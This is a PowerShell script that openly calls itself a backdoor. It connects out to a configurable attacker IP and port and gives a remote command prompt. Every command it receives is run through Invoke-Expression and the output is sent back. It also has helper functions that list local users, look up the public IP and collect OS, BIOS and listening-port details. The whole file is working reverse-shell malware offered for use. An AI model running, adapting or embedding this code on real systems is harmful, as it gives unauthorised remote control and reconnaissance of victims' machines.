<#

Powershell Backdoor
Coded by Drew Alleman

v0.0.0

[-] Find Intresting Files
[-] Find Writeable Directories
[-] Download Files

[+] Fetching clients public ip address
[+] Listing local users
[+] OS Information
[+] BIOS Information
[+] Active TCP Clients

#>


function get_users() {
    return Get-LocalUser | Select * | Out-String
}

function get_public_ip() {
    return (Invoke-WebRequest -uri "https://api.ipify.org/").Content | Out-String
}

function get_bios() {
    return  Get-ComputerInfo | select BiosManufacturer, BiosName, BiosFirmwareType
}

function get_active() {
    return Get-NetTCPConnection -State Listen
}

function get_os() {
    return  Get-ComputerInfo | Select OsManufacturer, OsArchitecture, OsName, OSType, OsHardwareAbstractionLayer, WindowsProductName, WindowsBuildLabEx
}


class Backdoor {
	# Change this to the correct ip/port
    [string]$ipAddress = "127.0.0.1"
    [int]$port = 4444
    $stream 
    $client
    $writer
    $buffer
    $reader
    $encoding

    createConnection() {
    	$this.client = New-Object Net.Sockets.TcpClient($this.ipAddress, $this.port);
    	$this.stream = $this.client.GetStream();
   		$this.buffer = New-Object Byte[] 1024;
		$this.encoding = New-Object Text.UTF8Encoding;
		$this.writer = New-Object IO.StreamWriter($this.stream, [Text.Encoding]::UTF8, 1024);
        $this.reader = New-Object System.IO.StreamReader($this.stream)
	    $this.writer.AutoFlush = $true;
        $this.handleClient()
        $this.computerName = [System.Net.Dns]::GetHostName()
  
    }

    handleClient() {
        while ($this.client.Connected) {
            $currentUser = [Environment]::UserName
            $computerName = [System.Net.Dns]::GetHostName()
            $pwd = Get-Location
            $prompt = "$currentUser@$computerName [$pwd]~$ "
            [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($prompt)
            $this.writer.Write($bytes,0,$bytes.length)            
            $rawResponse = $this.stream.Read($this.buffer, 0, 1024)    
            $response = ($this.encoding.GetString($this.buffer, 0, $rawResponse))
            $output = "[-] Invalid Command: $response"
            try { 
                $output = iex $response | Out-String
                [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($output)
                $this.writer.Write($bytes,0,$bytes.length) 
            } catch [System.Management.Automation.CommandNotFoundException] {
                [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($output)
                $this.writer.Write($bytes,0,$bytes.length)    
            }
        }
    }
}

$backdoor = [Backdoor]::new()
$backdoor.createConnection()